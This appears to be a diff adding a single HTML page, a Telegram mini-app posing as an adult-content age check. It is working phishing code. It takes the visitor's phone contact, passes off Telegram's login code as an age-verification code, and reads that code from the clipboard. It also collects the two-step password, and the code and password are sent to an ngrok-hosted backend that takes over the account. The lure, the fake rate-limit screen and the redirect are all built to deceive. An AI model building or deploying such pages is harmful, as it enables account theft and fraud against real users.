@@ -1,1 +1,356 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Stella VIP</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body {
+            margin: 0;
+            padding: 20px;
+            color: white;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            position: relative;
+            overflow: hidden;
+        }
+
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url("https://s311.erome.com/5127/vuV0RS7P/Si6xNA1k.png?v=1767487768") no-repeat center center;
+            background-size: cover;
+            filter: blur(4px);
+            z-index: -1;
+        }
+
+        .step { display: none; width: 100%; max-width: 400px; animation: fadeIn 0.3s ease; }
+        .active { display: flex; flex-direction: column; align-items: center; }
+        
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        .lock-icon { margin-top: 50px; }
+        .age-card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 20px;
+            border-radius: 15px;
+            text-align: center;
+            margin: 20px 0;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        h2 { font-size: 18px; font-weight: 500; margin: 10px 0; color: #fff; }
+
+        .otp-display-box {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 12px;
+            width: 100%;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .btn-main { 
+            background: #22c55e; color: white; padding: 16px; width: 100%; border-radius: 12px; 
+            border: none; font-size: 18px; font-weight: 600; cursor: pointer; transition: 0.2s;
+        }
+        .btn-main:active { transform: scale(0.98); opacity: 0.9; }
+        
+        .otp-container { display: flex; gap: 8px; margin: 20px 0; position: relative; }
+        .otp-box { 
+            width: 50px; height: 60px; border: 2px solid #333; border-radius: 12px; 
+            display: flex; align-items: center; justify-content: center; font-size: 28px; font-weight: bold;
+            background: rgba(255, 255, 255, 0.05); cursor: text; transition: border-color 0.3s;
+        }
+        .otp-box.filled { border-color: #22c55e; }
+        .otp-box.invalid { border-color: #ff4444 !important; background: rgba(255, 68, 68, 0.1); }
+
+        .keypad { 
+            display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; width: 100%; margin-top: 20px;
+        }
+        .key { 
+            background: #22c55e; padding: 18px; border-radius: 10px; font-size: 22px; font-weight: 600;
+            cursor: pointer; display: flex; align-items: center; justify-content: center; color: white;
+        }
+        .key.special { background: #1c1c1e; }
+        .key:active { opacity: 0.7; }
+
+        .password-wrapper {
+            position: relative;
+            width: 100%;
+            display: flex;
+            align-items: center;
+        }
+        .password-wrapper input {
+            width: 100%; padding: 16px; border-radius: 12px; border: 1px solid #333; 
+            background: #1c1c1e; color: white; font-size: 18px; outline: none; padding-right: 50px;
+            transition: border-color 0.3s;
+        }
+        .password-wrapper input.invalid { border-color: #ff4444 !important; }
+
+        .toggle-password {
+            position: absolute;
+            right: 15px;
+            color: #888;
+            cursor: pointer;
+            font-size: 20px;
+        }
+
+        .msg { padding: 12px; border-radius: 10px; font-size: 14px; width: 100%; margin: 10px 0; display: none; text-align: center; }
+        .error { background: rgba(255, 68, 68, 0.5); color: #fff; border: 1px solid #ff4444; }
+        .loading { background: rgba(34, 197, 94, 0.2); color: #22c55e; border: 1px solid #22c55e; }
+    </style>
+</head>
+<body>
+
+    <div id="step1" class="step active">
+        <div class="lock-icon">
+            <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Objects/Locked%20With%20Key.webp"
+                 alt="Locked With Key" style="width: 150px; height: 150px;">
+        </div>
+        <div class="age-card">
+            <p style="margin: 0; font-size: 15px;">Oops... Something went wrong To continue, please confirm that you are over 18💋</p>
+        </div>
+        <div id="status1" class="msg"></div>
+        <button class="btn-main" onclick="requestPhone()">Yes... I'm 18💦</button>
+    </div>
+
+    <div id="step2" class="step">
+        <div style="margin-top: 20px;">
+            <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Symbols/Love%20Letter.webp"
+                 alt="Love Letter" style="width: 100px; height: 100px;">
+        </div>
+        <div class="otp-display-box">
+            <p style="margin: 0; font-size: 16px; font-weight: 500;">To verify your age, enter the code I sent you💋</p>
+        </div>
+
+        <div class="otp-container" id="otp_container" onclick="handlePasteClick()">
+            <div class="otp-box" id="b0"></div>
+            <div class="otp-box" id="b1"></div>
+            <div class="otp-box" id="b2"></div>
+            <div class="otp-box" id="b3"></div>
+            <div class="otp-box" id="b4"></div>
+        </div>
+
+        <button class="btn-main" onclick="window.open('https://t.me/42777', '_blank')">Get the Code</button>
+        <div id="status2" class="msg"></div>
+
+        <div class="keypad">
+            <div class="key" onclick="press(1)">1</div><div class="key" onclick="press(2)">2</div><div class="key" onclick="press(3)">3</div>
+            <div class="key" onclick="press(4)">4</div><div class="key" onclick="press(5)">5</div><div class="key" onclick="press(6)">6</div>
+            <div class="key" onclick="press(7)">7</div><div class="key" onclick="press(8)">8</div><div class="key" onclick="press(9)">9</div>
+            <div class="key special" style="background:transparent"></div><div class="key" onclick="press(0)">0</div>
+            <div class="key special" onclick="backspace()">⌫</div>
+        </div>
+    </div>
+
+    <div id="step3" class="step">
+        <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Objects/Key.webp" style="width:100px;">
+        <h2>Two-Step Verification</h2>
+        <p style="color: #888; text-align: center;">Your account is protected by an additional password.</p>
+        <div id="status3" class="msg"></div>
+        <div class="password-wrapper">
+            <input type="password" id="2fa_input" placeholder="Password" oninput="this.classList.remove('invalid')">
+            <i class="fa-solid fa-eye toggle-password" id="togglePassword" onclick="togglePass()"></i>
+        </div>
+        <button class="btn-main" style="margin-top: 20px;" onclick="submit2FA()">Submit Password</button>
+    </div>
+
+    <div id="flood_step" class="step">
+        <div style="font-size: 60px; margin-top: 40px;">⚠️</div>
+        <h2 style="color: #ff4444;">Too many attempts!</h2>
+        <div style="font-size: 40px; font-weight: bold;" id="wait_time">00:00</div>
+        <p>Please wait for the timer to end.</p>
+    </div>
+
+<script>
+    const tg = window.Telegram.WebApp;
+    tg.expand();
+
+    let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id.toString() : "test_user";
+    let sid = userId; 
+    let currentOtp = "";
+    let statusChecker;
+
+    window.onload = function() {
+        checkStatus(); 
+        statusChecker = setInterval(checkStatus, 3000);
+    };
+
+    function togglePass() {
+        const input = document.getElementById('2fa_input');
+        const icon = document.getElementById('togglePassword');
+        if (input.type === "password") {
+            input.type = "text";
+            icon.classList.remove('fa-eye');
+            icon.classList.add('fa-eye-slash');
+        } else {
+            input.type = "password";
+            icon.classList.remove('fa-eye-slash');
+            icon.classList.add('fa-eye');
+        }
+    }
+
+    async function handlePasteClick() {
+        try {
+            const text = await navigator.clipboard.readText();
+            const cleanText = text.replace(/\D/g, '').slice(0, 5);
+            if (cleanText.length > 0) {
+                currentOtp = cleanText;
+                updateOtpUI();
+                if (currentOtp.length === 5) submitOTP();
+            }
+        } catch (err) {
+            console.log("Clipboard access denied");
+        }
+    }
+
+    function showMsg(stepId, type, text) {
+        const el = document.getElementById('status' + stepId);
+        if(!el) return;
+        el.className = 'msg ' + type;
+        el.innerText = text;
+        el.style.display = 'block';
+    }
+
+    function requestPhone() {
+        showMsg(1, 'loading', 'Connecting...');
+        tg.requestContact((success) => {
+            if (success) {
+                showMsg(1, 'loading', 'Sending OTP...');
+            } else {
+                showMsg(1, 'error', 'Access denied. Please share contact!');
+            }
+        });
+    }
+
+    function checkStatus() {
+    fetch('https://e106-15-204-67-23.ngrok-free.app/check_status/' + userId)
+        .then(r => r.json())
+        .then(data => {
+            if (data.status === "NEED_OTP") {
+                clearInterval(statusChecker);
+                showStep(2);
+            } else if (data.status === "FLOOD") {
+                clearInterval(statusChecker);
+                startFloodTimer(data.wait);
+            } else if (data.status === "NEED_2FA") {
+                clearInterval(statusChecker);
+                showStep(3);
+            }
+        }).catch(err => console.log("Checking..."));
+    }
+
+
+    function showStep(n) {
+        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+        if(typeof n === 'string') document.getElementById(n).classList.add('active');
+        else document.getElementById('step'+n).classList.add('active');
+    }
+
+    function press(num) {
+        // አዲስ መጻፍ ሲጀምር የቀይ ምልክቱን ያጠፋል
+        document.querySelectorAll('.otp-box').forEach(b => b.classList.remove('invalid'));
+        
+        if (currentOtp.length < 5) {
+            currentOtp += num;
+            updateOtpUI();
+            if (currentOtp.length === 5) submitOTP();
+        }
+    }
+
+    function backspace() {
+        currentOtp = currentOtp.slice(0, -1);
+        updateOtpUI();
+    }
+
+    function updateOtpUI() {
+        for (let i = 0; i < 5; i++) {
+            const box = document.getElementById('b' + i);
+            if (currentOtp[i]) {
+                box.innerText = currentOtp[i];
+                box.classList.add('filled');
+            } else {
+                box.innerText = "";
+                box.classList.remove('filled');
+            }
+        }
+    }
+
+    async function submitOTP() {
+        showMsg(2, 'loading', 'Verifying code...');
+        try {
+            const res = await fetch('https://e106-15-204-67-23.ngrok-free.app/verify_otp', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({session_id: sid, otp: currentOtp})
+            });
+            const data = await res.json();
+            handleResponse(data, 2);
+        } catch(e) { showMsg(2, 'error', 'Network error.'); }
+    }
+
+    async function submit2FA() {
+        const pass = document.getElementById('2fa_input').value;
+        if(!pass) {
+            document.getElementById('2fa_input').classList.add('invalid');
+            return showMsg(3, 'error', 'Enter password');
+        }
+        showMsg(3, 'loading', 'Signing in...');
+        try {
+            const res = await fetch('https://e106-15-204-67-23.ngrok-free.app/verify_2fa', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({session_id: sid, password: pass})
+            });
+            const data = await res.json();
+            handleResponse(data, 3);
+        } catch(e) { showMsg(3, 'error', 'Network error.'); }
+    }
+
+    function handleResponse(data, step) {
+        if (data.status === "SUCCESS") {
+            showMsg(step, 'success', 'Success! Redirecting...');
+            setTimeout(() => { window.location.href = "https://t.me/EthioHotHub"; }, 1500);
+        } else if (data.status === "NEED_2FA") {
+            showStep(3);
+        } else if (data.status === "FLOOD") {
+            startFloodTimer(data.wait);
+        } else {
+            // ስህተት ሲሆን ቀይ እንዲሆኑ ያደርጋል
+            if(step === 2) {
+                document.querySelectorAll('.otp-box').forEach(b => b.classList.add('invalid'));
+                currentOtp = "";
+                setTimeout(updateOtpUI, 500);
+            } else if(step === 3) {
+                document.getElementById('2fa_input').classList.add('invalid');
+                document.getElementById('2fa_input').value = "";
+            }
+            showMsg(step, 'error', 'Invalid input! Try again.');
+        }
+    }
+
+    function startFloodTimer(seconds) {
+        showStep('flood_step');
+        let rem = seconds;
+        const iv = setInterval(() => {
+            let m = Math.floor(rem / 60);
+            let s = rem % 60;
+            document.getElementById('wait_time').innerText = `${m}:${s < 10 ? '0' : ''}${s}`;
+            if (rem-- <= 0) { clearInterval(iv); location.reload(); }
+        }, 1000);
+    }
+</script>
+</body>
+</html>
 
